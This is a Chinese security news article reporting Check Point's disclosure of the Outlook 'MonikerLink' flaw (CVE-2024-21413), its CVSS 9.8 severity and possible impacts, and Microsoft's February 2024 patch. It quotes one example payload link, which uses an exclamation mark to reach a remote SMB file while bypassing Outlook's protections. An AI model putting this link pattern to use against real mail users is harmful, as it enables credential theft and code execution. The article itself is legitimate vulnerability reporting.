#  一个叹号可导致任意代码执行，Windows生态系统也曝“log4j漏洞”   
看雪学苑  看雪学苑   2024-02-18 17:59  
  
据Check Point Research官网博客，其最近一项研究揭示了Microsoft Outlook中的一个重大安全漏洞，允许攻击者在受害者的计算机上执行任意代码。微软已确认此漏洞，并且给予了该漏洞9.8分（满分10分）的CVSS严重性评分。  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GGJIO0an76ib1nu9BMqOtFbodU4Nd0xQSpkzDFyBWRhMx7ibqqFen4nmay1Lrxk6zn4FXY1eGzp9DA/640?wx_fmt=png&from=appmsg "")  
  
  
Outlook是Microsoft Office套件中的一个较为流行的桌面应用程序，常被全球组织用于发送接收电子邮件、安排会议等。  
  
  
据了解，Check Point的安全研究员Haifei Li发现了此漏洞（CVE-2024-21413），并将之命名为#MonikerLink。当用户使用易受攻击的Microsoft Outlook版本点击带有恶意链接的电子邮件时，就会导致远程代码执行（RCE），并且该漏洞还使攻击者能够绕过Office文档的受保护视图。通常而言，钓鱼邮件攻击链需要一次双击和一次单击；而当攻击者利用上“Moniker Link”漏洞，那么就只需要一次单击。  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GGJIO0an76ib1nu9BMqOtFbkX3RXt2bNCS70RdHaZVjMlx3fMIjBdmE24RfTiaWe3IcwPBq3c2yf9g/640?wx_fmt=png&from=appmsg "")  
  
  
Check Point表示，其已确认这个#MonikerLink漏洞在最新的Windows 10/11 + Microsoft 365（Office 2021）环境中存在。并且其他Office版本/版本也可能受到影响。Check Point认为这是一个被忽视的问题，它在Windows/COM生态系统中存在了几十年——因为它存在于COM API的核心。  
  
  
该漏洞源于Outlook错误地解析特制的超链接以访问COM对象，攻击者能以一个叹号绕过内置的Outlook保护。Check Point Research对此给出了如下示例：  
  
*<a href="file:///\\10.10.111.111\test\test.rtf!something">CLICK ME</a>*  
  
这种类型的超链接绕过了Outlook现有的安全机制，当单击链接时，Outlook将访问“\\10.10.111.111\test\test.rtf”远程资源，而不会引发任何警告或错误。  
  
  
Check Point表示，该漏洞可能允许攻击者执行一系列恶意活动，包括但不限于：  
  
① 数据窃取：访问并窃取存储在受害者系统或其网络中的敏感信息。  
  
② 恶意软件安装：部署恶意软件（如勒索软件、间谍软件、键盘记录器等），以进一步破坏受害者的系统或在网络中传播。  
  
③ 特权提升：利用泄漏的凭据或任意代码执行来获得受害者系统或网络的更高权限，可能导致整个系统或网络被攻破。  
  
④ 身份盗窃：利用窃取的NTLM凭据冒充受害者，进行欺诈活动或访问机密资源。  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GGJIO0an76ib1nu9BMqOtFbAPHL3jAbEyzLnsvAxcgJhBIgViafJgKd1Zfwavia8hZ2CmBw3vBlYRaw/640?wx_fmt=png&from=appmsg "")  
  
  
Check Point已将此问题报告给微软安全响应中心（MSRC），其在2024年2月的“补丁星期二”中修复了此漏洞，强烈建议所有Outlook用户尽快更新。  
  
  
博客链接：  
https://blog.checkpoint.com/research/check-point-research-unveils-critical-monikerlink-vulnerability-in-microsoft-outlook-with-a-9-8-cvss-severity-score/  
  
  
  
编辑：左右里  
  
资讯来源：Check Point Research  
  
转载请注明出处和本文链接  
  
  
**每日涨知识**  
  
间谍软件（Spyware）  
  
间谍软件是一种恶意软件，旨在在受害者不知情的情况下收集和窃取受害者的敏感信息。  
木马，广告软件和系统监视器是不同类型的间谍软件。  
间谍软件监视并存储受害者的 Internet  
活动（击键，浏览器历史记录等），还可以获取用户名，密码，财务信息等。  
它还可以将此  
机密数据发送到网络罪犯操作的服务器，以便可以在随后的网络攻击中使用。  
  
  
﹀  
  
﹀  
  
﹀  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Uia4617poZXP96fGaMPXib13V1bJ52yHq9ycD9Zv3WhiaRb2rKV6wghrNa4VyFR2wibBVNfZt3M5IuUiauQGHvxhQrA/640?wx_fmt=jpeg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8E9S6vNnUMRCOictT4PicNGMgHmsIkOvEno4oPVWrhwQCWNRTquZGs2ZLYic8IJTJBjxhWVoCa47V9Rw/640?wx_fmt=gif "")  
  
**球分享**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8E9S6vNnUMRCOictT4PicNGMgHmsIkOvEno4oPVWrhwQCWNRTquZGs2ZLYic8IJTJBjxhWVoCa47V9Rw/640?wx_fmt=gif "")  
  
**球点赞**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8E9S6vNnUMRCOictT4PicNGMgHmsIkOvEno4oPVWrhwQCWNRTquZGs2ZLYic8IJTJBjxhWVoCa47V9Rw/640?wx_fmt=gif "")  
  
**球在看**  
  
****  
****  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/1UG7KPNHN8FxuBNT7e2ZEfQZgBuH2GkFjvK4tzErD5Q56kwaEL0N099icLfx1ZvVvqzcRG3oMtIXqUz5T9HYKicA/640?wx_fmt=gif "")  
  
戳  
“阅读原文  
”  
一起来充电吧！  
  
